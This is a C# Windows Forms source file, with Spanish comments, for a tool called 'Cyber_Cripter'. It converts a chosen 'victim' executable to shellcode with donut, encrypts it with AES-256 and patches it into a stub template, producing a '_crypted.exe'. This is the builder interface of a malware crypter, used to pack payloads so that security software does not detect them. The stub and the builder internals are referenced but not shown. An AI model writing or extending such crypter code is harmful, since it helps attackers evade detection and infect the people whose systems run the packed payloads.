using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Cyber_Cripter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            statusTextBox.Multiline = true;
            statusTextBox.ReadOnly = true;
            statusTextBox.ScrollBars = ScrollBars.Vertical;
            statusTextBox.WordWrap = false;
            statusTextBox.AcceptsReturn = true;
        }

        private static string ByteArrayToHex(byte[] data)
        {
            if (data == null)
                return "<null>";

            StringBuilder sb = new StringBuilder();

            sb.AppendLine($"[{data.Length} bytes]");

            for (int i = 0; i < data.Length; i++)
            {
                sb.Append(data[i].ToString("X2"));

                if ((i + 1) % 16 == 0)
                    sb.AppendLine();
                else
                    sb.Append(' ');
            }

            if (data.Length % 16 != 0)
                sb.AppendLine();

            return sb.ToString();
        }

        private void browseFile_Click(object sender, EventArgs e)
        {
            using (var dlg = new OpenFileDialog { Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*" })
            {
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    fileRoute.Text = dlg.FileName;
                    statusTextBox.Text = "";
                    
                }
            }
        }

        private void encryptBtn_Click(object sender, EventArgs e)
        {
            // Validar que el usuario ha seleccionado un .exe válido
            string inputPath = fileRoute.Text;
            if (string.IsNullOrWhiteSpace(inputPath) || !File.Exists(inputPath)
                || inputPath == "File to encrypt path")
            {
                Show("Select a valid input executable first.", error: true);
                return;
            }

            // Verificar que el stub template existe (generado con stub\build.bat)
            string appDir       = AppDomain.CurrentDomain.BaseDirectory;
            string templatePath = Path.Combine(appDir, "Resources", "stub_template.exe");
            if (!File.Exists(templatePath))
            {
                Show("stub_template.exe not found at:\n" + templatePath +
                     "\nBuild it via stub\\build.bat (checkout building instructions in stub\\README.md).", error: true);
                return;
            }

            // Obtener ruta de salida: outputs/<nombre_input>_crypted.exe
            string outputDir  = Path.Combine(appDir, "outputs");
            string outputName = Path.GetFileNameWithoutExtension(inputPath) + "_crypted.exe";
            string outputPath = Path.Combine(outputDir, outputName);

            // Deshabilitar el botón mientras se procesa para evitar dobles clics
            encryptBtn.Enabled = false;
            Show("Converting payload to shellcode (donut)...");

            try
            {
                // Paso 1: convertir el .exe víctima a shellcode PIC mediante donut.exe
                byte[] shellcode = Donut.Convert(inputPath);
                Show("Shellcode generated (" + shellcode.Length + " B). Encrypting & patching stub...");

                // Paso 2: cifrar el shellcode con AES-256 y parchearlo dentro del stub template
                    // StubBuilder genera la clave derivada, escribe los metadatos (IV, timestamp,
                    // heap_marker) en la sección .cdata del stub, y guarda el fichero final en outputPath
                byte[] stubTemplate = File.ReadAllBytes(templatePath);
                var report = StubBuilder.Build(stubTemplate, shellcode, outputPath);

                // Mostrar resumen del build
                Show(string.Format(
                    "Done.\r\n" +
                    "  Output path:      {0}\r\n" +
                    "  Shellcode:   {1} B  ->  Ciphertext: {2} B\r\n" +
                    "  Embedded:    {3} B (.cdata)   Overlay: {4} B\r\n" +
                    "  HeapMarker (Hex):\t {5}\r\n" +
                    "  Stable Region Size:\t {6} B\r\n" +
                    "  Build Timestamp:    {7} (0x{7:X16})\r\n" +
                    "  Hash from Stable Region: {8}\r\n" +
                    "  Derived key: {9}" ,
                    report.OutputPath, report.ShellcodeBytes, report.CiphertextBytes,
                    report.Half1Bytes, report.Half2Bytes, report.HeapMarkerHex, report.StableRegion, report.Timestamp, report.HashStableRegion, report.KeyHex));

                
            }
            catch (Exception ex)
            {
                Show("Failed: " + ex.Message, error: true);
            }
            finally
            {
                // Reactivar el botón siempre, tanto si ha habido error como si no
                encryptBtn.Enabled = true;
            }
        }

        // Muestra mensaje por consola (statusTextBox)
        public void Show(string msg, bool error = false)
        {
            statusTextBox.ForeColor = error
                ? System.Drawing.Color.IndianRed
                : System.Drawing.Color.LightGreen;
            statusTextBox.Text = msg;
            statusTextBox.Refresh();
        }
    }
}
